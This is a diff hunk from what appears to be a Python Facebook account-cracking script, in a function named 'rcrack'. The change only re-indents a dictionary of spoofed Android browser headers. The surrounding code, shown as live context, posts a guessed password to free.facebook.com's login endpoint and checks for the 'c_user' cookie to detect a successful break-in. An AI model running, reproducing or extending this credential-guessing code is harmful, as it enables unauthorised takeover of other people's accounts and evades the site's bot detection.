@@ -259,21 +259,21 @@ def rcrack(uid,pwx,tl):
 			"pass":ps,
 			"login":"Log In"}
 			header_freefb = {
-    'authority': 'free.facebook.com',
-    'method': 'GET',
-    'path': '/login/?li=45kOZPKRXtam7sOItt3tJMmr&e=1348029&shbl=1&ref=dbl&refsrc=deprecated&rtime=1678678632&subno_key=AaFeeivdtHjEZknE_KAGehmdMtgzrzEN_cP6ef0hDk7UOQDsPMNS6-WWebBk1ta-o8PG_-X7LwLeqqkMDWrlugHgg0IssPd_5MRewrCQjB3rBiwdDIj-UE_VB8N2Ex3oK-3y3T0JPXhQRLS4lUarnzkMjFram7UqDpqgCuJ7ntOIW1GQqhoaRgVJKH-Fo5w0RrGrLYtUqz2LvngAklj7yYeDghAFKwNCyO7O98z-M_Om8bqZxzGl63g5ctiD55G0HMgnrtsBYR7r-sUd59CZabLZdBaGcdfJ-Pnn-08KlDSy5YAjnaOysCE8K4GFgVpLMrM&hrc=1&_rdr',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-    'cache-control': 'max-age=0',
-    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'none',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': pro,}
+		    'authority': 'free.facebook.com',
+		    'method': 'GET',
+		    'path': '/login/?li=45kOZPKRXtam7sOItt3tJMmr&e=1348029&shbl=1&ref=dbl&refsrc=deprecated&rtime=1678678632&subno_key=AaFeeivdtHjEZknE_KAGehmdMtgzrzEN_cP6ef0hDk7UOQDsPMNS6-WWebBk1ta-o8PG_-X7LwLeqqkMDWrlugHgg0IssPd_5MRewrCQjB3rBiwdDIj-UE_VB8N2Ex3oK-3y3T0JPXhQRLS4lUarnzkMjFram7UqDpqgCuJ7ntOIW1GQqhoaRgVJKH-Fo5w0RrGrLYtUqz2LvngAklj7yYeDghAFKwNCyO7O98z-M_Om8bqZxzGl63g5ctiD55G0HMgnrtsBYR7r-sUd59CZabLZdBaGcdfJ-Pnn-08KlDSy5YAjnaOysCE8K4GFgVpLMrM&hrc=1&_rdr',
+		    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+		    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+		    'cache-control': 'max-age=0',
+		    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+		    'sec-ch-ua-mobile': '?1',
+		    'sec-ch-ua-platform': '"Android"',
+		    'sec-fetch-dest': 'document',
+		    'sec-fetch-mode': 'navigate',
+		    'sec-fetch-site': 'none',
+		    'sec-fetch-user': '?1',
+		    'upgrade-insecure-requests': '1',
+		    'user-agent': pro,}
 			lo = session.post('https://free.facebook.com/login/?li=45kOZPKRXtam7sOItt3tJMmr&e=1348029&shbl=1&ref=dbl&refsrc=deprecated&rtime=1678678632&subno_key=AaFeeivdtHjEZknE_KAGehmdMtgzrzEN_cP6ef0hDk7UOQDsPMNS6-WWebBk1ta-o8PG_-X7LwLeqqkMDWrlugHgg0IssPd_5MRewrCQjB3rBiwdDIj-UE_VB8N2Ex3oK-3y3T0JPXhQRLS4lUarnzkMjFram7UqDpqgCuJ7ntOIW1GQqhoaRgVJKH-Fo5w0RrGrLYtUqz2LvngAklj7yYeDghAFKwNCyO7O98z-M_Om8bqZxzGl63g5ctiD55G0HMgnrtsBYR7r-sUd59CZabLZdBaGcdfJ-Pnn-08KlDSy5YAjnaOysCE8K4GFgVpLMrM&hrc=1&_rdr',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			if 'c_user' in log_cookies:
